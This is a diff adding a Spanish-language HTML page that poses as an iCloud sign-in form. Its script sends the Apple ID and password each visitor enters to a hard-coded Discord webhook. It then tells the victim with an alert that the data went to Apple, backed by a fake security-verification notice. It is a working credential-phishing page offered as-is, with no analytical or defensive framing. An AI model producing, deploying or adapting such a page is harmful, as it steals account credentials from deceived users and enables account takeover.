@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>iCloud</title>
+  <style>
+    body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
+    form { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input { display: block; margin: 10px 0; width: 100%; padding: 10px; }
+    button { padding: 10px; background: #0070c9; color: white; border: none; border-radius: 4px; }
+    .notice { font-size: 0.8rem; color: red; margin-top: 1rem; }
+  </style>
+</head>
+<body>
+  <form id="loginForm">
+    <h2>Inicia sesión en iCloud</h2>
+    <input type="text" name="email" placeholder="Apple ID" required>
+    <input type="password" name="password" placeholder="Contraseña" required>
+    <button type="submit">Iniciar sesión</button>
+    <div class="notice">⚠️Su identidad está siendo verificada de acuerdo con los protocolos de seguridad de Apple..</div>
+  </form>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const email = e.target.email.value;
+      const password = e.target.password.value;
+
+      const payload = {
+        content: `**Login**\n📧 Email: \`${email}\`\n🔒 Password: \`${password}\``
+      };
+
+      await fetch("https://discord.com/api/webhooks/1379172611740794880/oo8CaPcrY2c_IJqe1muUSG8x8H-RnLd9yJ5Lh-z68VfuznWZdb5mF_MhaxpV8FTRlbbZ", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      alert("Hemos enviado sus datos a Apple de forma exitosa. Le mantendremos informado a través del correo electrónico registrado.");
+    });
+  </script>
+</body>
+</html>
